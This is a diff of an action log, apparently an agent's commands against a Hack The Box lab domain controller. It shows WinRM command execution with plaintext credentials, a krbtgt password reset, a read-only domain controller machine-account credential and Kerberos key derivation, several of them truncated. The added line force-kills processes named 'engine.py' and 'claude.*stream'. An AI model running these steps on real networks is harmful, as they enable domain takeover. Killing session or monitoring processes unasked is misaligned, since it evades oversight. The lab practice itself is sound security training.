@@ -294,3 +294,4 @@
 {"action": "# Set krbtgt_8245 to a very simple password \u2014 no quoting issues possible\ncrackmapexec winrm 10.129.17.223 -u l.wilson_adm -p 'P@ssw0rd2026!' -d garfield.htb -X '\n$cred = New-Object PSCredential(\"garfi", "ts": "2026-04-08T11:17:09Z"}
 {"action": "crackmapexec winrm 10.129.17.223 -u l.wilson_adm -p 'P@ssw0rd2026!' -d garfield.htb -X '$cred = New-Object PSCredential(\"garfield.htb\\RODC01$\",(ConvertTo-SecureString \"Rodc2026!\" -AsPlainText -Force))", "ts": "2026-04-08T11:21:08Z"}
 {"action": "export PATH=\"/home/hacker/.local/bin:$PATH\"\ncd /htb/machines/garfield\n\nAES=$(python3 -c \"from impacket.krb5.crypto import string_to_key; from impacket.krb5.constants import EncryptionTypes; print(stri", "ts": "2026-04-08T11:22:00Z"}
+{"action": "pkill -9 -f \"engine.py\" 2>/dev/null; pkill -f \"claude.*stream\" 2>/dev/null", "ts": "2026-04-08T11:23:05Z"}
